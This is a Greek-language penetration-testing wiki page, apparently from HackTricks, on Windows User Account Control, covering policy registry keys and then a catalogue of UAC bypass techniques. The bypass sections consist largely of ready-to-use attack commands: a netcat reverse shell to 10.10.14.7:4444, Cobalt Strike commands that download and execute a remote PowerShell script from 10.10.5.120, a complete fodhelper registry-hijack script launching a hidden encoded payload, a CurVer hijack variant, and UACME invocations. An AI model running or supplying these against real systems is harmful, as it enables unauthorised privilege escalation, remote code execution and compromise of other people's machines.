# UAC - Έλεγχος λογαριασμού χρήστη

{{#include ../../banners/hacktricks-training.md}}

## UAC

Ο [Έλεγχος λογαριασμού χρήστη (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια λειτουργία που εμφανίζει **μήνυμα συγκατάθεσης για ενέργειες με αυξημένα δικαιώματα**. Οι εφαρμογές έχουν διαφορετικά επίπεδα `integrity` και ένα πρόγραμμα με **υψηλό επίπεδο** μπορεί να εκτελεί εργασίες που **ενδέχεται να θέσουν σε κίνδυνο το σύστημα**. Όταν είναι ενεργοποιημένο το UAC, οι εφαρμογές και οι εργασίες **εκτελούνται πάντα στο πλαίσιο ασφαλείας ενός λογαριασμού χωρίς δικαιώματα διαχειριστή**, εκτός αν ένας διαχειριστής εξουσιοδοτήσει ρητά αυτές τις εφαρμογές/εργασίες να αποκτήσουν πρόσβαση στο σύστημα σε επίπεδο διαχειριστή. Πρόκειται για μια λειτουργία ευκολίας που προστατεύει τους διαχειριστές από ακούσιες αλλαγές, αλλά δεν θεωρείται όριο ασφαλείας.<sup>[[2]](#references)</sup>

Για περισσότερες πληροφορίες σχετικά με τα επίπεδα integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Όταν χρησιμοποιείται το UAC, ένας χρήστης-διαχειριστής λαμβάνει 2 tokens: ένα τυπικό token χρήστη για την εκτέλεση συνήθων ενεργειών με μεσαίο επίπεδο integrity και ένα token με τα δικαιώματα διαχειριστή.

Αυτή η [σελίδα](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) εξετάζει σε βάθος τον τρόπο λειτουργίας του UAC και περιλαμβάνει τη διαδικασία σύνδεσης, την εμπειρία χρήστη και την αρχιτεκτονική του UAC.<sup>[[2]](#references)</sup> Οι διαχειριστές μπορούν να χρησιμοποιούν πολιτικές ασφαλείας για να διαμορφώνουν τον τρόπο λειτουργίας του UAC, ανάλογα με τις ανάγκες του οργανισμού τους, σε τοπικό επίπεδο (μέσω του secpol.msc) ή να τις διαμορφώνουν και να τις διανέμουν μέσω Group Policy Objects (GPO) σε περιβάλλον τομέα Active Directory. Οι διάφορες ρυθμίσεις εξετάζονται αναλυτικά [εδώ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Υπάρχουν 10 ρυθμίσεις Group Policy που μπορούν να οριστούν για το UAC. Ο παρακάτω πίνακας παρέχει περισσότερες λεπτομέρειες:

| Ρύθμιση Group Policy                                                                                                                                                                                                                                                                                                                                                           | Κλειδί μητρώου                | Προεπιλεγμένη ρύθμιση                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Έλεγχος λογαριασμού χρήστη: Λειτουργία έγκρισης διαχειριστή για τον ενσωματωμένο λογαριασμό διαχειριστή](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Απενεργοποιημένο)                                             |
| [Έλεγχος λογαριασμού χρήστη: Συμπεριφορά του μηνύματος ανύψωσης δικαιωμάτων για διαχειριστές σε λειτουργία έγκρισης διαχειριστή](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Ερώτηση για συγκατάθεση για αρχεία που δεν είναι των Windows στην ασφαλή επιφάνεια εργασίας) |
| [Έλεγχος λογαριασμού χρήστη: Συμπεριφορά του μηνύματος ανύψωσης δικαιωμάτων για τυπικούς χρήστες](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Ερώτηση για διαπιστευτήρια στην ασφαλή επιφάνεια εργασίας)         |
| [Έλεγχος λογαριασμού χρήστη: Εντοπισμός εγκαταστάσεων εφαρμογών και αίτημα ανύψωσης δικαιωμάτων](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Ενεργοποιημένο· απενεργοποιημένο από προεπιλογή στην έκδοση Enterprise)           |
| [Έλεγχος λογαριασμού χρήστη: Ανύψωση δικαιωμάτων μόνο για εκτελέσιμα αρχεία που είναι υπογεγραμμένα και επικυρωμένα](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Απενεργοποιημένο)                                             |
| [Έλεγχος λογαριασμού χρήστη: Ανύψωση δικαιωμάτων μόνο για εφαρμογές UIAccess που είναι εγκατεστημένες σε ασφαλείς θέσεις](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Ενεργοποιημένο)                                              |
| [Έλεγχος λογαριασμού χρήστη: Εκτέλεση όλων των διαχειριστών σε λειτουργία έγκρισης διαχειριστή](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Ενεργοποιημένο)                                              |
| [Έλεγχος λογαριασμού χρήστη: Να επιτρέπεται στις εφαρμογές UIAccess να ζητούν ανύψωση δικαιωμάτων χωρίς χρήση της ασφαλούς επιφάνειας εργασίας](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Απενεργοποιημένο)                                             |
| [Έλεγχος λογαριασμού χρήστη: Μετάβαση στην ασφαλή επιφάνεια εργασίας κατά την εμφάνιση μηνύματος ανύψωσης δικαιωμάτων](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Ενεργοποιημένο)                                              |
| [Έλεγχος λογαριασμού χρήστη: Εικονικοποίηση αποτυχιών εγγραφής αρχείων και μητρώου σε θέσεις ανά χρήστη](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Ενεργοποιημένο)                                              |

### Πολιτικές για την εγκατάσταση λογισμικού στα Windows

Οι **τοπικές πολιτικές ασφαλείας** (το "secpol.msc" στα περισσότερα συστήματα) είναι διαμορφωμένες από προεπιλογή έτσι ώστε να **αποτρέπουν χρήστες χωρίς δικαιώματα διαχειριστή από την εγκατάσταση λογισμικού**. Αυτό σημαίνει ότι, ακόμη κι αν ένας χρήστης χωρίς δικαιώματα διαχειριστή μπορεί να κατεβάσει το πρόγραμμα εγκατάστασης του λογισμικού σας, δεν θα μπορεί να το εκτελέσει χωρίς λογαριασμό διαχειριστή.

### Κλειδιά μητρώου για να απαιτείται από το UAC αίτημα ανύψωσης δικαιωμάτων

Ως τυπικός χρήστης χωρίς δικαιώματα διαχειριστή, μπορείτε να διασφαλίσετε ότι ο «τυπικός» λογαριασμός **θα πρέπει να εισάγει διαπιστευτήρια στο UAC** όταν επιχειρεί να εκτελέσει ορισμένες ενέργειες. Για αυτό απαιτείται η τροποποίηση ορισμένων **κλειδιών μητρώου**, για την οποία χρειάζονται δικαιώματα διαχειριστή, εκτός αν υπάρχει **UAC bypass** ή ο attacker είναι ήδη συνδεδεμένος ως διαχειριστής.

Ακόμη κι αν ο χρήστης ανήκει στην ομάδα **Administrators**, αυτές οι αλλαγές αναγκάζουν τον χρήστη να **εισαγάγει ξανά τα διαπιστευτήρια του λογαριασμού του** για να εκτελέσει ενέργειες διαχείρισης.

**Στην πράξη, αυτό είναι χρήσιμο μόνο αν έχετε ήδη token με αυξημένα δικαιώματα, UAC bypass ή κάποια εσφαλμένη ρύθμιση που σας επιτρέπει να αλλάξετε αυτά τα κλειδιά· διαφορετικά, η εγγραφή στο μητρώο θα αποκλειστεί.**

Τα κλειδιά και οι καταχωρίσεις μητρώου που πρέπει να αλλάξετε είναι τα εξής (με τις προεπιλεγμένες τιμές τους σε παρένθεση):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Αυτό μπορεί επίσης να γίνει χειροκίνητα μέσω του εργαλείου Τοπική πολιτική ασφαλείας. Μετά την αλλαγή, για τις ενέργειες διαχείρισης ζητείται από τον χρήστη να εισαγάγει ξανά τα διαπιστευτήριά του.

### Σημείωση

**Ο Έλεγχος λογαριασμού χρήστη δεν αποτελεί όριο ασφαλείας.** Επομένως, οι τυπικοί χρήστες δεν μπορούν να ξεφύγουν από τους λογαριασμούς τους και να αποκτήσουν δικαιώματα διαχειριστή χωρίς exploit τοπικής κλιμάκωσης δικαιωμάτων.

### Ζητήστε από έναν χρήστη «πλήρη πρόσβαση στον υπολογιστή»

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### Προνόμια UAC

- Η λειτουργία Protected Mode του Internet Explorer χρησιμοποιεί ελέγχους ακεραιότητας για να εμποδίζει διεργασίες με υψηλό επίπεδο ακεραιότητας (όπως τα προγράμματα περιήγησης ιστού) να αποκτούν πρόσβαση σε δεδομένα χαμηλού επιπέδου ακεραιότητας (όπως ο φάκελος προσωρινών αρχείων Internet). Αυτό επιτυγχάνεται εκτελώντας το πρόγραμμα περιήγησης με token χαμηλής ακεραιότητας. Όταν το πρόγραμμα περιήγησης προσπαθεί να αποκτήσει πρόσβαση σε δεδομένα που είναι αποθηκευμένα στη ζώνη χαμηλής ακεραιότητας, το λειτουργικό σύστημα ελέγχει το επίπεδο ακεραιότητας της διεργασίας και επιτρέπει την πρόσβαση ανάλογα. Αυτή η λειτουργία βοηθά στην αποτροπή επιθέσεων απομακρυσμένης εκτέλεσης κώδικα από την πρόσβαση σε ευαίσθητα δεδομένα του συστήματος.
- Όταν ένας χρήστης συνδέεται στα Windows, το σύστημα δημιουργεί ένα access token που περιέχει μια λίστα με τα προνόμια του χρήστη. Τα προνόμια ορίζονται ως ο συνδυασμός των δικαιωμάτων και των δυνατοτήτων ενός χρήστη. Το token περιέχει επίσης μια λίστα με τα διαπιστευτήρια του χρήστη, τα οποία χρησιμοποιούνται για την πιστοποίηση του χρήστη στον υπολογιστή και σε πόρους του δικτύου.

### Autoadminlogon

Για να ρυθμίσετε τα Windows ώστε να συνδέουν αυτόματα έναν συγκεκριμένο χρήστη κατά την εκκίνηση, ορίστε το **κλειδί μητρώου `AutoAdminLogon`**. Αυτό είναι χρήσιμο σε περιβάλλοντα kiosk ή για σκοπούς δοκιμών. Χρησιμοποιήστε το μόνο σε ασφαλή συστήματα, καθώς εκθέτει τον κωδικό πρόσβασης στο μητρώο.

Ορίστε τα ακόλουθα κλειδιά χρησιμοποιώντας τον Επεξεργαστή Μητρώου ή το `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Για να επαναφέρετε την κανονική συμπεριφορά σύνδεσης, ορίστε το `AutoAdminLogon` σε 0.

## Παράκαμψη UAC

> [!TIP]
> Σημειώστε ότι αν έχετε γραφική πρόσβαση στο θύμα, η παράκαμψη UAC είναι απλή, καθώς μπορείτε απλώς να κάνετε κλικ στο «Yes» όταν εμφανιστεί η προτροπή UAC

Η παράκαμψη UAC απαιτείται στην εξής περίπτωση: **το UAC είναι ενεργοποιημένο, η διεργασία σας εκτελείται σε περιβάλλον μεσαίου επιπέδου ακεραιότητας και ο χρήστης σας ανήκει στην ομάδα administrators**.

Είναι σημαντικό να αναφέρουμε ότι η παράκαμψη του UAC είναι **πολύ δυσκολότερη όταν βρίσκεται στο υψηλότερο επίπεδο ασφάλειας (Always) απ' ό,τι στα υπόλοιπα επίπεδα (Default).**

### Γρήγορη διαλογή από κέλυφος μεσαίου επιπέδου ακεραιότητας

Πριν δοκιμάσετε μια παράκαμψη, επιβεβαιώστε ότι βρίσκεστε στο σωστό σενάριο και αντιστοιχίστε το build του υπολογιστή σε γνωστές μεθόδους που λειτουργούν:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Πρακτικές σημειώσεις:
- Αν `EnableLUA=0`, δεν χρειάζεστε bypass: οποιοδήποτε admin token μπορεί να ζητήσει απευθείας υψηλό επίπεδο ακεραιότητας.
- Τα `ConsentPromptBehaviorAdmin=2` ή `5` είναι το συνηθισμένο σενάριο για auto-elevate / COM-based bypasses.
- Η επιλογή `Always Notify` ανεβάζει τον πήχη, αλλά θα πρέπει και πάλι να δοκιμάσετε την ακριβή έκδοση αντί να θεωρήσετε ότι θα αποτύχει: το UACME εξακολουθεί να παρακολουθεί ορισμένες μεθόδους `AlwaysNotify compatible` σε σύγχρονες εκδόσεις των Windows.<sup>[[3]](#references)</sup>

### Το UAC είναι απενεργοποιημένο

Αν το UAC είναι ήδη απενεργοποιημένο (`ConsentPromptBehaviorAdmin` είναι **`0`**), μπορείτε να **εκτελέσετε ένα reverse shell με δικαιώματα admin** (υψηλό επίπεδο ακεραιότητας) χρησιμοποιώντας κάτι όπως:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + επαναχρησιμοποιήσιμο debug object

Το local RPC interface του AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` μπορεί να δημιουργήσει μια διεργασία με ενεργοποιημένο το debugging. Οι διεργασίες που δημιουργούνται με debugging στο ίδιο thread μοιράζονται το debug object του thread· ένα συμβάν δημιουργίας μεταφέρει ένα handle διεργασίας με πλήρη πρόσβαση, ακόμα κι όταν το ίδιο το αποτέλεσμα του RPC παρέχει μόνο περιορισμένη πρόσβαση. Έτσι, η επαναχρησιμοποίηση του debug object γίνεται primitive UAC για ένα μέλος της ομάδας Administrators με medium integrity.<sup>[[11]](#references)[[12]](#references)</sup>

Μια πρακτική αλυσίδα είναι η εξής:<sup>[[11]](#references)[[12]](#references)</sup>

1. Καλέστε τη μέθοδο local RPC (απευθείας ή μέσω του `NdrAsyncClientCall`) για να δημιουργήσετε μια μη elevated διεργασία-δόλωμα με ενεργοποιημένο το debugging.
2. Αναζητήστε το `ProcessDebugObjectHandle` με το `NtQueryInformationProcess`, αποσυνδέστε το με το `NtRemoveProcessDebug`, διατηρήστε το object και τερματίστε τη διεργασία-δόλωμα.
3. Χρησιμοποιήστε το ίδιο RPC interface για να δημιουργήσετε μια αξιόπιστη auto-elevated διεργασία και, στη συνέχεια, συσχετίστε το αποθηκευμένο object με το thread που εκτελεί την κλήση μέσω του `DbgUiSetThreadDebugObject`.
4. Καλέστε το `WaitForDebugEvent` και λάβετε το handle διεργασίας από το `CREATE_PROCESS_DEBUG_EVENT`· δημιουργήστε αντίγραφό του με το `NtDuplicateObject` πριν συνεχίσετε.
5. Δώστε το duplicated handle στο `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` και εκκινήστε το payload με μια extended startup-info δομή. Έτσι, επαναχρησιμοποιείται το context της elevated διεργασίας και η child διεργασία αποκτά μια σχέση με parent που φαίνεται αξιόπιστη.

Αναζητήστε τη σύντομη ακολουθία ενεργειών και όχι μόνο το auto-elevated binary: δημιουργία διεργασίας μέσω local AppInfo RPC, queries του `ProcessDebugObjectHandle`, αποσύνδεση/επανασύνδεση του debugger, άμεσο συμβάν δημιουργίας-debug, αντιγραφή handle και μια child διεργασία της οποίας το καταγεγραμμένο parent δεν αντιστοιχεί στη διεργασία που εκτέλεσε τα APIs δημιουργίας.<sup>[[12]](#references)</sup>

### **Πολύ** Basic UAC "bypass" (πλήρης πρόσβαση στο file system)

Αν έχετε ένα shell με χρήστη που ανήκει στην ομάδα Administrators, μπορείτε να **κάνετε mount το κοινόχρηστο C$** μέσω SMB (file system) τοπικά σε έναν νέο δίσκο και θα έχετε **πρόσβαση σε ολόκληρο το file system** (ακόμα και στον home folder του Administrator).

> [!WARNING]
> **Φαίνεται πως αυτό το κόλπο δεν λειτουργεί πλέον**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Παράκαμψη UAC με Cobalt Strike

Οι τεχνικές του Cobalt Strike λειτουργούν μόνο αν το UAC δεν έχει οριστεί στο μέγιστο επίπεδο ασφάλειας.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** και **Metasploit** διαθέτουν επίσης αρκετά modules για **bypass** του **UAC**.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Τα auto-elevated COM objects παραμένουν μια πρακτική επιφάνεια UAC σε σύγχρονες εκδόσεις. Το `ICMLuaUtil` εξακολουθεί να καταγράφεται από το UACME ως λειτουργικό στις τρέχουσες εκδόσεις των Windows, ενώ τα offensive εργαλεία συνεχίζουν να προσαρμόζουν το `CMSTPLUA`, συνδυάζοντας μια διεργασία σε interactive desktop, εκτέλεση 64-bit και, μερικές φορές, πλαστοπροσωπία PEB/process πριν από την κλήση του COM Elevation Moniker.<sup>[[3]](#references)</sup>

Πρακτικές συμβουλές:
- Προτιμήστε μια διεργασία **64-bit** στο **interactive session** του χρήστη (συνήθως το `explorer.exe` ή μια θυγατρική διεργασία του).
- Αν αποτύχει ένα raw shell, δοκιμάστε ξανά από μια υλοποίηση BOF / UACME αντί για ένα απλό wrapper του `CreateProcess`.
- Αναμένετε ότι η εκτέλεση της θυγατρικής διεργασίας θα γίνει σε **ξεχωριστή elevated διεργασία**· πολλά BOF δεν κάνουν elevate το τρέχον beacon επιτόπου.

### KRBUACBypass

Documentation και εργαλείο στο [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

Το [**UACME**](https://github.com/hfiref0x/UACME) είναι μια συλλογή τεχνικών UAC bypass. Κάντε compile με Visual Studio ή MSBuild· το build δημιουργεί αρκετά executables (για παράδειγμα, `Source\Akagi\output\x64\Debug\Akagi.exe`), οπότε επιλέξτε τη μέθοδο που είναι κατάλληλη για το target build.<sup>[[3]](#references)</sup>\
Προσοχή: ορισμένα bypass εκκινούν ορατά προγράμματα ή εμφανίζουν prompts που μπορεί να ειδοποιήσουν τον χρήστη.<sup>[[3]](#references)</sup>

Το UACME αναφέρει την **έκδοση build από την οποία άρχισε να λειτουργεί κάθε τεχνική**.<sup>[[3]](#references)</sup> Μπορείτε να αναζητήσετε μια τεχνική που επηρεάζει τις εκδόσεις σας:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Επίσης, χρησιμοποιώντας [αυτή](https://en.wikipedia.org/wiki/Windows_10_version_history) τη σελίδα, βρίσκετε την έκδοση των Windows `1607` από τις εκδόσεις build.

Μια πρακτική ροή εργασίας είναι να **αξιολογήσετε πρώτα το build του host** και έπειτα να εκτελέσετε την αντίστοιχη μέθοδο:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- Το `WinPwnage` συγκρίνει γρήγορα το τοπικό build με τις γνωστές μεθόδους UAC που διαθέτει, κάτι που βοηθά να απορρίπτονται γρήγορα τα PoC που δεν λειτουργούν πλέον.<sup>[[4]](#references)</sup>
- Το `UACME` παραμένει ο καλύτερος δημόσιος κατάλογος για την αντιστοίχιση ενός bypass με ένα συγκεκριμένο build. Η έκδοση 3.7.1 πρόσθεσε τις μεθόδους 83–85, ενώ η προηγούμενη έκδοση επανέλεγξε τις υπάρχουσες μεθόδους στο **Windows 11 25H2**· ελέγξτε ξανά τον πίνακα μεθόδων και τις σημειώσεις έκδοσης αντί να θεωρείτε δεδομένο ότι ένα παλιό PoC εξακολουθεί να ισχύει χωρίς αλλαγές.<sup>[[3]](#references)[[9]](#references)</sup>

### Αλυσίδες WNF/UIAccess συμβατές με Always Notify (UACME 3.7.1)

Το `Always Notify` δεν εξαλείφει όλα τα UAC bypass. Το UACME 3.7.1 υλοποιεί τρεις νέες μεθόδους x64 που συνδυάζουν κατάσταση περιβάλλοντος/πρωτοκόλλου ελεγχόμενη από τον χρήστη με συμπεριφορά elevated scheduled-task ή UIAccess, και τις χαρακτηρίζει όλες `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** ανακατευθύνετε το `SystemRoot` ώστε η εργασία `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`, η οποία ενεργοποιείται μέσω WNF, να κάνει το elevated `taskhostw.exe` side-load το `unifiedconsent.dll`. Το UACME την υποστηρίζει από το Windows 10 build 19041.
- **84 — TabTip:** χρησιμοποιήστε το ίδιο primitive μεταβλητής περιβάλλοντος στο UIAccess `TabTip.exe`, το οποίο φορτώνει τα `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` ή `rsaenh.dll`, ανάλογα με το build, και έπειτα κάντε pivot από το UIAccess context που προκύπτει με υψηλή ακεραιότητα. Το UACME την υποστηρίζει από το Windows 8.1 / Server 2016.
- **85 — Narrator:** κάντε hijack το πρωτόκολλο `feedback-hub` ανά χρήστη, χειριστείτε το Narrator με `Alt+CapsLock+F` και, στη συνέχεια, εκκινήστε ένα εγγράψιμο αντίγραφο του `osk.exe` που κάνει side-load το `OskSupport.dll`. Απαιτεί διαδραστική επιφάνεια εργασίας και υποστηρίζεται από το Windows 10 1809 / Server 2019.

Αφού δημιουργήσετε τις μονάδες payload και το Akagi όπως περιγράφεται στο UACME, καλέστε τον αντίστοιχο αριθμό μεθόδου (η προαιρετική εντολή έχει ως προεπιλογή το `cmd.exe`):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Οι μέθοδοι 84 και 85 εξαρτώνται από το UIAccess/την αλληλεπίδραση με την επιφάνεια εργασίας, επομένως μην περιμένετε να λειτουργήσουν χωρίς αλλαγές από το Session 0 ή από ένα μη διαδραστικό κέλυφος υπηρεσίας. Και οι τρεις τροποποιούν την κατάσταση περιβάλλοντος/πρωτοκόλλου και τοποθετούν DLL· εξετάστε την υλοποίηση και αφαιρέστε αυτά τα αρχεία μετά τις δοκιμές.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Το έμπιστο δυαδικό αρχείο `fodhelper.exe` εκτελείται αυτόματα με αυξημένα δικαιώματα στα σύγχρονα Windows. Κατά την εκκίνηση, αναζητά την παρακάτω διαδρομή μητρώου ανά χρήστη, χωρίς να επικυρώνει το ρήμα `DelegateExecute`. Η τοποθέτηση μιας εντολής εκεί επιτρέπει σε μια διεργασία Medium Integrity (όταν ο χρήστης ανήκει στην ομάδα Administrators) να εκκινήσει μια διεργασία High Integrity χωρίς προτροπή UAC.

Διαδρομή μητρώου που αναζητά το fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>Βήματα PowerShell (ορίστε το payload σας και έπειτα ενεργοποιήστε το)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Σημειώσεις:
- Λειτουργεί όταν ο τρέχων χρήστης είναι μέλος των Administrators και το επίπεδο UAC είναι προεπιλεγμένο/ελαστικό (όχι Always Notify με πρόσθετους περιορισμούς).
- Χρησιμοποιήστε τη διαδρομή `sysnative` για να εκκινήσετε PowerShell 64-bit από διεργασία 32-bit σε Windows 64-bit.
- Το Payload μπορεί να είναι οποιαδήποτε εντολή (PowerShell, cmd ή διαδρομή EXE). Για stealth, αποφύγετε τα UIs που εμφανίζουν προτροπές.

#### Trigger μέσω `ComputerDefaults.exe` για τον ίδιο handler `ms-settings`

Το `ComputerDefaults.exe` επιλύει την ίδια συσχέτιση `ms-settings\Shell\Open\command` ανά χρήστη με το `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Αφού ορίσετε την προεπιλεγμένη εντολή και την κενή τιμή `DelegateExecute` παραπάνω, χρησιμοποιήστε το `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` ως εναλλακτικό trigger· μην επαναλάβετε τη ρύθμιση του registry.<sup>[[13]](#references)[[14]](#references)</sup> Οι προϋποθέσεις για administrator με medium integrity και η πολιτική UAC που αναφέρονται παραπάνω στις σημειώσεις για το `fodhelper.exe` εξακολουθούν να ισχύουν.<sup>[[2]](#references)[[3]](#references)</sup> Το UACME καταγράφει αυτό το trigger από το Windows 10 RS4 (build 17134), επομένως επαληθεύστε το στο build του στόχου.<sup>[[3]](#references)</sup>

#### Παραλλαγή CurVer/extension hijack (μόνο HKCU)

Πρόσφατα δείγματα που κάνουν κατάχρηση του `fodhelper.exe` αποφεύγουν το `DelegateExecute` και, αντί γι' αυτό, **ανακατευθύνουν το ProgID `ms-settings`** μέσω της τιμής `CurVer` ανά χρήστη. Το auto-elevated binary εξακολουθεί να επιλύει τον handler στο `HKCU`, επομένως δεν απαιτείται token admin για να δημιουργηθούν τα κλειδιά:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

